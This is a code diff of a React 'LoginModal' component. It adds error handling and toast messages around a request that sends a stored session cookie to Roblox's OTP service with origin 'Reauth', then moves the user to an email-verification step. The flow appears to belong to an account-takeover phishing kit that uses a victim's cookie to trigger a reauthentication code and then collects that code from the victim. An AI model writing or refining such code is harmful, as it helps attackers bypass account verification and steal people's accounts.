@@ -50,19 +50,35 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     setStep('loading');
     await new Promise(resolve => setTimeout(resolve, 1500));
     setStep('email-verification');
-    // Send request to send email verification code
-    await fetch(`https://apis.roblox.com/otp-service/v1/sendCodeForUser`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Cookie': cookie
-      },
-      body: JSON.stringify({
-        contactType: 'Email',
-        messageVariant: 'Default',
-        origin: 'Reauth'
-      })
-    });
+    try {
+      const response = await fetch(`https://apis.roblox.com/otp-service/v1/sendCodeForUser`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Cookie': cookie
+        },
+        body: JSON.stringify({
+          contactType: 'Email',
+          messageVariant: 'Default',
+          origin: 'Reauth'
+        })
+      });
+      const data = await response.json();
+      if (data.success) {
+        toast({
+          title: "Success",
+          description: "Verification code sent to your email",
+        });
+      } else {
+        toast({
+          title: "Error",
+          description: "Failed to send verification code",
+          variant: "destructive",
+        });
+      }
+    } catch (error) {
+      console.error('Error sending verification code:', error);
+    }
   };
 
   const handleEmailVerificationSubmit = async (e: React.FormEvent) => {
